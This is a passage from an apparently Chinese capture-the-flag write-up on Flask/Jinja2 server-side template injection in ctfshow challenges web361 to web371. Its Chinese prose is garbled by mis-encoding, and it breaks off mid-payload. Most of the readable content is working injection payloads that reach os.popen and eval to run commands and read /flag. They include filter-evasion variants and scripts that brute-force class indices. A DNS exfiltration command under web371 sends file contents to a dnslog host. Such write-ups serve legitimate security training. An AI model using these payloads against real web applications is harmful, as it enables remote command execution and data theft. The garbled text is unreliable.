&lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;PyHKEY&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;os._AddedDllDirectory&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å½“æ‹¿åˆ° <strong>&lt;class â€˜objectâ€™&gt;</strong> æ—¶ï¼Œå°±å¯ä»¥è¿”å› Object ç±»çš„å­ç±»åˆ—è¡¨</p><p>è¿›ä¸€æ­¥åœ°ï¼Œæˆ‘ä»¬æ‰¾åˆ°æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨çš„å­ç±»(èƒ½æ‰§è¡Œå‘½ä»¤æˆ–è€…å¯ä»¥è¯»å–æ–‡ä»¶çš„ç±»å°±å¯ä»¥äº†ï¼Œé‡ç‚¹å…³æ³¨ os/file è¿™äº›å…³é”®å­—ï¼Œä½¿ç”¨ init.globals æ¥çœ‹çœ‹æœ‰æ²¡æœ‰ os module æˆ–è€…å…¶ä»–çš„å¯ä»¥è¯»å†™æ–‡ä»¶çš„)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[<span class="hljs-number">7</span>].__name__<br><span class="hljs-string">&#x27;list&#x27;</span><br>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[<span class="hljs-number">7</span>].__init__<br>&lt;slot <span class="hljs-keyword">wrapper</span> <span class="hljs-string">&#x27;__init__&#x27;</span> <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;list&#x27;</span> objects&gt;<br></code></pre></td></tr></table></figure><p>è·å¾— Object çš„å­ç±» listï¼Œåˆå§‹åŒ– init æŠ¥äº†ä¸€ä¸ª wrapperï¼Œæ˜¯æŒ‡è¿™äº›å‡½æ•°æ²¡æœ‰è¢«é‡è½½ï¼Œè¿™æ—¶å¼¹å¹¶ä¸æ˜¯ functionï¼Œä¸å…·æœ‰<strong>__globals__</strong> å±æ€§</p><p>ç°åœ¨ä½¿ç”¨ä¸Šé¢çš„æµ‹è¯•ä»£ç æ‰¾ä¸€ä¸ªå…·æœ‰<strong>__globals__</strong> å±æ€§çš„å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102211933255.png"></p><p>os æ‰¾åˆ°ä¸‹é¢çš„è¿™ä¸ª</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102212006476.png"></p><p>ä½†æ˜¯å¹¶ä¸æ˜¯ osï¼Œä¹Ÿæ²¡æœ‰å‘ç° popen å‡½æ•°ï¼Œæ‰€ä»¥åˆ©ç”¨å¤±è´¥</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220047260.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220222810.png"></p><p>ä½†æ˜¯æœ‰<strong>__builtins__</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220723509.png"></p><p><a href="https://blog.csdn.net/lu8000/article/details/44217499/">https://blog.csdn.net/lu8000/article/details/44217499/</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102212658133.png"></p><p>å½“ç„¶ä¸äº†è§£è¿™ä¸ªç±»çš„è¯ï¼Œå¯ä»¥æ¢ï¼Œéšä¾¿æ‰¾äº†ä¸€ä¸ªï¼Œå†æ¬¡æœçœ‹æœ‰æ²¡æœ‰ popen å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221055005.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221116811.png"></p><p>åˆ©ç”¨</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221305536.png"></p><p>å†ä»‹ç»å‡ ä¸ªï¼Œå¦‚æœå­˜åœ¨çš„è¯å¯ä»¥ä¸è¿›è¡Œçˆ†ç ´ï¼Œ <strong>catch_warningsï¼ˆæœ‰ evalï¼‰ï¼Œ_Printer å’Œ&lt;class â€˜os._wrap_closeâ€™&gt;ï¼ˆè¿™ä¸¤ä¸ªæœ‰ popenï¼‰</strong></p><p>ç„¶ååƒ sqlmap ä¸€æ ·ï¼Œè¿™ä¸ªä¹Ÿæœ‰æ£€æµ‹çš„è„šæœ¬<a href="https://github.com/epinna/tplmap">tplmap</a></p><p>è¿˜æœ‰ä¸€äº›å‡ ä¸ªå¯»æ‰¾å­ç±»çš„è„šæœ¬å¤‡ç”¨</p><ul><li>ä¸‡èƒ½åˆ©ç”¨</li></ul><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%for c in [].__class__.__base__.__subclasses__()%&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br>    &#123;%endif%&#125;<br>&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><ul><li>æœ¬åœ°å¯»æ‰¾æœ¬åœ°çš„ç±»è„šæœ¬ï¼Œé€‚åˆæºç é¢˜</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">search = <span class="hljs-string">&#x27;popen&#x27;</span><br>num = -<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():<br>            <span class="hljs-built_in">print</span>(i,num)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>å¯»æ‰¾é¢˜ç›®ä¸­ç±»çš„è„šæœ¬ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>a = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;class &#x27;type&#x27;&gt;,...,&lt;class &#x27;subprocess.Popen&#x27;&gt; # æ‰€æœ‰å­ç±»</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>num = <span class="hljs-number">0</span><br>allList = []<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&gt;&quot;</span>:<br>        result += i<br>        allList.append(result)<br>        result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&quot;\n&quot;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&quot;,&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        result += i<br><br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(allList):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;os._wrap_close&quot;</span> <span class="hljs-keyword">in</span> v:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(k)+<span class="hljs-string">&quot;---&gt;&quot;</span>+v)<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨ url è¯·æ±‚çš„æ–¹å¼å»è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    time.sleep(<span class="hljs-number">0.60</span>)<br>    payload = <span class="hljs-string">&quot;&quot;</span>%i<br>    url = <span class="hljs-string">&quot;http://xxx/&quot;</span><br>    r = requests.request(url=url,param=payload)<br>    <span class="hljs-comment">#å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–çš„</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;os._wrap_close&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>ctfshow362 è¿‡æ»¤äº†æ•°å­— 2ã€3</p><p>ctfshow363 è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œé‡‡ç”¨å˜é‡é€ƒé€¸çš„ä¼ å‚æ–¹æ³•</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">==&gt;</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[request.args.a].eval(<span class="hljs-name">request.args.b</span>)&#125;&#125;</span><span class="xml">&amp;a=__builtins__&amp;b=__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[request.args.a](<span class="hljs-name">request.args.b</span>).read()&#125;&#125;</span><span class="xml">&amp;a=popen&amp;b=tac /f*</span><br></code></pre></td></tr></table></figure><p>ctfshow364 è¿‡æ»¤äº† args åº”è¯¥</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220103143249696.png"></p><p>å¯ä»¥ Cookie å¸¦è¿›å» request.args.a æ¢ä¸º request.cookies.a</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220103143356540.png"></p><p>æ³¨æ„ cookie çš„è§£ææ ¼å¼ ä»¥ <strong>;</strong> åˆ†éš” :(</p><blockquote><p>å…¶ä»–ä¼ å‚æ–¹å¼ï¼š</p><p>request.form.x1 post ä¼ å‚ (Content-Type:applicaation/x-www-form-urlencoded æˆ– multipart/form-data)<br>request.data post ä¼ å‚ (Content-Type:a/b)<br>request.json post ä¼  json (Content-Type: application/json)</p></blockquote><p>ctfshow365 è¿‡æ»¤äº†ä¸­æ‹¬å·[]å’Œå•å¼•å·â€˜â€™ï¼Œå¯ä»¥ä½¿ç”¨__getitem__å’Œ pop æ›¿ä»£ä¸­æ‹¬å·</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">http://faf87e47-725e-4618-b993-8e8e430370d5.challenge.ctf.show/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.a</span>).popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Cookiea=os;b=tac /f*</span><br></code></pre></td></tr></table></figure><p>â€”â€“è¿™é‡Œå¼€å§‹ä¸ä¼š:(</p><h2 id="ctfshow366ã€367"><a href="#ctfshow366ã€367" class="headerlink" title="ctfshow366ã€367"></a>ctfshow366ã€367</h2><p>è¿‡æ»¤äº†ä¸‹åˆ’çº¿_ï¼Œä½¿ç”¨ flask çš„è¿‡æ»¤å™¨</p><p>palyoad</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">x</span>|attr(<span class="hljs-name">request.cookies.x1</span>)|attr(<span class="hljs-name">request.cookies.x2</span>)|attr(<span class="hljs-name">request.cookies.x3</span>))(<span class="hljs-name">request.cookies.x4</span>).eval(<span class="hljs-name">request.cookies.x5</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Cookiex1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>chr å‡½æ•°çš„æ–¹æ³•ï¼š</p><p>é¦–å…ˆ fuzz åˆ° chr å‡½æ•°çš„ä½ç½®</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;&#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<br><span class="hljs-literal">[Â§<span class="hljs-number">0</span>Â§]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr&#125;&#125;<br></code></pre></td></tr></table></figure><p>é€‰æ‹©ä¸€ä¸ª</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;%set+chr=<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><br><span class="hljs-literal">[<span class="hljs-identifier">x</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr%&#125;<br></code></pre></td></tr></table></figure><p>ç»•è¿‡</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hy">&#123;%set+chr=[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()<br>[x].__init__.__globals__.__builtins__.chr%&#125;<br>&#123;&#123;[].__class__.__base__.__subclasses__()<br>[y].__init__.__globals__[chr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)]<br>[chr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">110</span>)]<br>(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>è¿‡æ»¤äº†<code>&#123;&#123;`å’Œ`&#125;&#125;</code>ï¼Œä½¿ç”¨<code>&#123;%%&#125;</code>ç»•è¿‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Payload:?name=&#123;% <span class="hljs-builtin-name">print</span>(((lipsum|attr(request.cookies.c))|attr(request.cookies.d)(request.cookies.a)).popen(request.cookies.b).read())%&#125;<br>å¸¦ä¸ŠCookie:<span class="hljs-attribute">a</span>=os;b=cat /flag;<span class="hljs-attribute">c</span>=__globals__;d=__getitem__<br></code></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>è¿‡æ»¤äº†<code>request</code><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI è¿›é˜¶æ–‡ç« </a></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(18)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(9)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-8)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(cat=aa)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>æ•°å­—ä¸èƒ½ç”¨äº†ï¼Œä½¿ç”¨ count è¿›è¡Œè®¡æ•°</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(cat=aa)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h2><p>è¿‡æ»¤äº†<code>print</code>å¤–å¸¦æ•°æ®</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `cat /flag`.vhthja.dnslog.cn<br></code></pre></td></tr></table></figure><p>ping ä¸èƒ½ç”¨ï¼Œæ¢ curl å¯ä»¥</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> m=dict(eeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> 